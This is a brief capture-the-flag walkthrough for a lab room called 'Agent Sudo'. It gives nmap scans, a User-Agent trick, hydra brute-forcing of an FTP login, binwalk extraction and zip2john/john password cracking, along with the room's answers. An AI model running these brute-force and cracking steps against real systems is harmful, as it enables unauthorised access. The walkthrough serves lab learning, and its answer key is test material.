# Agent Sudo

> You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.

<br>

Process:
- 1) scanning 
  - port scan: `nmap -T4 <ip>`
    - ports open = **3**
  - aggressive scan: `nmap -T4 -A -p 21,22,80`
- 2) enumerate port 80: 
  - use burp to change user agent to "C"
    - i.e. `User-agent: C` in request 
  - agent name = **chris**
- 3) try to brute force FTP (weak password)
  - `hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://<ip>`
  - password found = **crystal**
- 4) login to FTP
  - `ftp chris@<ip>` -> [crystal]`
  - found files indicating password hidden in file
- 5) crack password protected file:
  - `stegcracker cute-alien.jpg` -- failed 
  - `binwalk cutie.png` -- found text file 
    - extract text file:
    - `binwalk -e cutie.png`
- 6) crack zip file:
  - `zip2john 8702.zip > a.hash`
  - `john -w <wordlist> > a.hash`
  - password found: **alient**